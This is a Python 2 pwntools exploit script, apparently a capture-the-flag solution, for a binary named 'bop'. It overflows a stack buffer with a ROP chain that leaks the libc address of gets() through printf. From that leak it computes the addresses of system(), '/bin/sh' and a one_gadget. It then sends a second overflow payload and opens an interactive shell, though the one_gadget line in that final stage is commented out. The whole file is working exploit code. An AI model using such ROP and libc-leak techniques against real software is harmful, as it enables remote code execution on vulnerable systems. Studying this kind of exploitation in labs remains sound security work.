from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
#elf = ELF("./bop")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}


#p = process("./bop")
#p = remote("localhost", 5000)
p = gdb.debug("./bop",'''
break *_start
break *0x4012f9
break *0x401359
break *0x401365
''')

# Gadgets
pop_rdi = 0x4013d3
pop_rsi = 0x4013d1 # rdi;r15
pop_rbp = 0x4011fd
leave_ret = 0x4012f7

# Functions
main = 0x4012f9
gets_plt = 0x40135e
gets_plt_got = 0x404040
printf_plt = 0x4010f0
printf_plt_got = 0x404038


# LIBC leak payload
payload = ""
payload += "A" * (40 - 8)
payload += "C" * 8
payload += p64(pop_rdi)
payload += p64(gets_plt_got)
payload += p64(pop_rsi)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(printf_plt)
payload += p64(0x401352)

# Leaks
p.recv()
p.sendline(payload)
libc_gets_leak = int(p.recv(8)[::-1].encode('hex'),16)
libc_main = libc_gets_leak - 391648
libc_system = libc_gets_leak - 202464
libc_binsh = libc_gets_leak + 1248333
one_gadget = libc_main + 0xe3b04

print "libc gets() leak: ", hex(libc_gets_leak)
print "libc main() leak: ", hex(libc_main)
print "libc system() leak: ", hex(libc_system)
print "libc /bin/sh leak: ", hex(libc_binsh)

# RCE
payload2 = ""
payload2 += "B" * 48
#payload2 += p64(one_gadget)

p.sendline(payload2)
p.interactive()

